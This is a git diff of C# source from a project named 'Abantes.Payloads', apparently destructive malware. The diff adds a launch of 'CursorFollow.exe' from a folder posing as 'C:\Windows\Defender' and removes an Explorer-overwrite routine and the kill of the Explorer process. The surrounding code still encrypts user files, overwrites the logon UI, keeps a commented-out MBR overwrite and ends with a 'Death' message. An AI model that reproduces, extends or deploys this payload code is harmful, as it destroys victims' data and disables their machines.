@@ -44,7 +44,8 @@ namespace Abantes.Payloads
                         }
                         break;
                     case 3:
-                        //Cursor follow
+                        string extractPath = @"C:\Windows\Defender";
+                        Others.StartProcess(extractPath + "\\CursorFollow.exe", "");
                         break;
                     case 4:
                         if (_random.Next(100) > 50)
@@ -181,14 +182,6 @@ namespace Abantes.Payloads
             ScriptProcess.StartInfo.FileName = extractPath + @"\logonOverwrite.bat"; 
             ScriptProcess.Start();
         }
-        public static void ExplorerOverwrite()
-        {
-            string extractPath = @"C:\Windows\Defender";
-            Process ScriptProcess = new Process();
-            ScriptProcess.StartInfo.CreateNoWindow = false;
-            ScriptProcess.StartInfo.FileName = extractPath + @"\ExplorerOverwrite.bat";
-            ScriptProcess.Start();
-        }
         public static void EncryptUserFiles()
         {
             List<string> pathsToEncrypt = new List<string>();
@@ -241,8 +234,6 @@ namespace Abantes.Payloads
             EncryptUserFiles();
             LogonUIOverwrite();
             //MBR_Overwrite();
-            ExplorerOverwrite();
-            Others.KillProcess("explorer");
             MessageBox.Show("Death");
         }
     }
